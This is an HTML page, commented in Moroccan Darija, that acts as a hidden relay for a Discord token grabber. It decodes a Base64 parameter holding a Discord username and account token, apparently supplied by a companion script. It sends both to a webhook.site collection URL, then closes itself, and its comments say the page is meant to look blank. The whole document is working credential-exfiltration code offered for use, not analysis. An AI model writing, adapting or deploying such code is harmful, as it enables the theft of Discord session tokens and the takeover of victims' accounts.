<!DOCTYPE html>
<html>
<head>
    <title>Token Proxy</title>
    <!-- Had l'page ghadi tkon makhfiya, ma kayban fiha walou -->
    <script>
        // ⚠️ IMPORTANT: BDDEL HAD L'URL B'L'URL DIAL WEBHOOK.SITE DIALEK L'ORIGINAL
        const WEBHOOK_SITE_BASE_URL = "https://webhook.site/discordquest"; 
        
        const params = new URLSearchParams(window.location.search);
        let finalWebhookUrl = WEBHOOK_SITE_BASE_URL; // L'URL li ghadi nseftou liha l'request

        let user = '';
        let token = '';

        // If the 'd' parameter (data) is present from Discord script
        if (params.has('d')) {
            try {
                const secretData = params.get('d');
                // Decode Base64 then decode URI component
                const decodedString = decodeURIComponent(atob(secretData));
                
                // Split the string into username and token (kanet `${tag}|${token}`)
                [user, token] = decodedString.split('|');

                // ⭐ MODIFICATION HNA: Nzidou l'username w l'token k'query parameters l'URL
                finalWebhookUrl += `?user=${encodeURIComponent(user)}&token=${encodeURIComponent(token)}`;

            } catch (e) {
                console.error("Error decoding 'd' parameter:", e);
                // Fallback in case of decoding error, send raw data as an error parameter
                finalWebhookUrl += `?error_decoding_d=${encodeURIComponent(params.get('d'))}`;
            }
        } 
        // If the 'err' parameter (error token) is present
        else if (params.has('err')) {
            try {
                const rawErrorToken = params.get('err');
                const decodedErrorToken = atob(rawErrorToken); // Decode Base64
                
                // ⭐ MODIFICATION HNA: Nzidou l'error token k'query parameter l'URL
                finalWebhookUrl += `?error_token=${encodeURIComponent(decodedErrorToken)}`;
            } catch (e) {
                console.error("Error decoding 'err' parameter:", e);
                // Fallback in case of decoding error
                finalWebhookUrl += `?error_decoding_err=${encodeURIComponent(params.get('err'))}`;
            }
        }

        // Only send the fetch request if the URL has been updated with parameters
        if (finalWebhookUrl !== WEBHOOK_SITE_BASE_URL) {
            // ⭐ Kanseftou POST request, wakha l'data f'query parameters, webhook.site kayqbel had l'format.
            fetch(finalWebhookUrl, {
                method: 'POST' // Nkhaliwh POST, ḥit l'screenshot bayen bih webhook.site kaytwaqqa3 POST
                // Ma kan7tajouch body aw Content-Type ila kenti kat3tamad ghir 3la query parameters
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Webhook.site proxy error, status:', response.status);
                }
                return response.text(); 
            })
            .then(text => {
                console.log('Token data forwarded to webhook.site successfully from proxy. Response:', text);
            })
            .catch(error => {
                console.error('Error forwarding token data to webhook.site from proxy:', error);
            })
            .finally(() => {
                window.close();
            });
        } else {
             // Close if no valid data or error parameter found in the URL from Discord
            window.close();
        }
    </script>
</head>
<body>
    <!-- Had l'page ghadi tban khawya w makhfiya -->
</body>
</html>
